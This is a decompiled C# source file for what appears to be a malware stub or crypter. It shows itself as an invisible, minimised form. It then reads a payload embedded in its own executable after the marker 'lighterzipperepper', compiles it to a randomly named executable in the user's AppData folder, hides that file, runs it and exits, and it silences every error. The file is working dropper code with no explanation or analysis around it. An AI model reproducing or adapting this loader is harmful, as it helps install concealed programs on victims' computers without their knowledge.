using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ConS;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	private string App;

	public string source;

	private const string owp = "lighterzipperepper";

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		App = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Randomisi(8) + ".exe";
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(10, 10);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form1");
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	public string Randomisi(int lenght)
	{
		VBMath.Randomize();
		StringBuilder stringBuilder = new StringBuilder("");
		char[] array = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm".ToCharArray();
		checked
		{
			for (int i = 1; i <= lenght; i++)
			{
				VBMath.Randomize();
				int num = (int)Math.Round(Conversion.Int((float)(array.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f);
				stringBuilder.Append(array[num]);
			}
			return stringBuilder.ToString();
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			byte[] bytes = Read.Go(Application.get_ExecutablePath(), "0");
			string @string = Encoding.Default.GetString(bytes);
			string[] array = Strings.Split(@string, "lighterzipperepper", -1, (CompareMethod)0);
			source = array[1];
			iCompiler.GenerateExecutable(App, source, "");
			File.SetAttributes(App, FileAttributes.Hidden);
			Process.Start(App);
			Application.Exit();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
